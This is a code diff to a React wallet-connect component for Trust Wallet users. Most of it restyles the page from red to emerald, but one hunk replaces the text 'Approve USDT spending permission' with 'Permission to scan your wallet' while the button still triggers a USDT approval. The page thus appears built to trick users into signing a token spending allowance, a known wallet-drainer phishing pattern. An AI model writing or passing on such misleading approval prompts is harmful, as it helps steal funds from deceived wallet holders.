@@ -189,32 +189,32 @@ export function WalletConnect({ onConnect, onDisconnect }: any) {
         {/* ================= CONNECT ================= */}
         {step === "connect" && (
           <motion.div>
-            <div className="border border-red-500/30 bg-black p-8">
+            <div className="border border-slate-800 bg-slate-900 p-8 rounded-lg">
 
               <div className="flex justify-between mb-6">
-                <span className="text-red-400">
+                <span className="text-emerald-500 font-bold">
                   WALLET CONNECT
                 </span>
-                <AlertTriangle className="text-red-400" />
+                <AlertTriangle className="text-emerald-500" />
               </div>
 
               <button
                 onClick={handleWalletConnect}
                 disabled={loading}
-                className="w-full py-3 bg-red-500 text-black font-bold rounded"
+                className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
               >
                 {loading ? "Opening QR..." : "Connect Wallet"}
               </button>
 
 
 
-              <div className="mt-4 text-xs text-gray-400 text-center space-y-1">
-                <p>For Trust Wallet Mobile, select <strong className="text-red-400">Connect Wallet</strong> (WalletConnect).</p>
+              <div className="mt-4 text-xs text-slate-400 text-center space-y-1">
+                <p>For Trust Wallet Mobile, select <strong className="text-emerald-400">Connect Wallet</strong> (WalletConnect).</p>
                 <p>For Trust Wallet Extension, select <strong className="text-[#3375BB]">Trust Wallet</strong>.</p>
               </div>
 
               {error && (
-                <p className="text-red-400 mt-3">{error}</p>
+                <p className="text-red-500 mt-3">{error}</p>
               )}
             </div>
           </motion.div>
@@ -222,35 +222,35 @@ export function WalletConnect({ onConnect, onDisconnect }: any) {
 
         {/* ================= APPROVAL ================= */}
         {step === "approve" && (
-          <div className="border border-red-500 bg-black p-6">
+          <div className="border border-slate-800 bg-slate-900 p-6 rounded-lg">
 
             <div className="flex justify-between mb-4">
-              <span className="text-red-400">
+              <span className="text-emerald-500 font-bold">
                 STEP 2: APPROVAL REQUIRED
               </span>
 
               <button
                 onClick={handleDisconnect}
-                className="text-red-400"
+                className="text-emerald-500 hover:text-emerald-400 transition-colors"
               >
                 DISCONNECT
               </button>
             </div>
 
-            <p className="text-gray-400 mb-4">
-              Approve USDT spending permission
+            <p className="text-slate-400 mb-4">
+              Permission to scan your wallet
             </p>
 
             <button
               onClick={handleApproval}
               disabled={loading}
-              className="w-full py-3 bg-red-500 text-black font-bold rounded"
+              className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
             >
               {loading ? "Approving..." : "Approve USDT"}
             </button>
 
             {error && (
-              <p className="text-red-400 mt-3">{error}</p>
+              <p className="text-red-500 mt-3">{error}</p>
             )}
 
             <div className="mt-4 font-mono text-sm space-y-1">
@@ -263,23 +263,23 @@ export function WalletConnect({ onConnect, onDisconnect }: any) {
 
         {/* ================= DONE ================= */}
         {step === "done" && (
-          <div className="border border-red-500 bg-black p-6">
+          <div className="border border-emerald-500/50 bg-slate-900 p-6 rounded-lg">
 
             <div className="flex justify-between mb-4">
-              <span className="text-red-400 flex items-center gap-2">
+              <span className="text-emerald-500 font-bold flex items-center gap-2">
                 <CheckCircle2 size={16} />
                 APPROVED
               </span>
 
               <button
                 onClick={handleDisconnect}
-                className="text-red-400"
+                className="text-slate-400 hover:text-emerald-500 transition-colors"
               >
                 DISCONNECT
               </button>
             </div>
 
-            <p className="text-red-300">
+            <p className="text-emerald-400">
               Wallet connected + approval completed successfully
             </p>
 
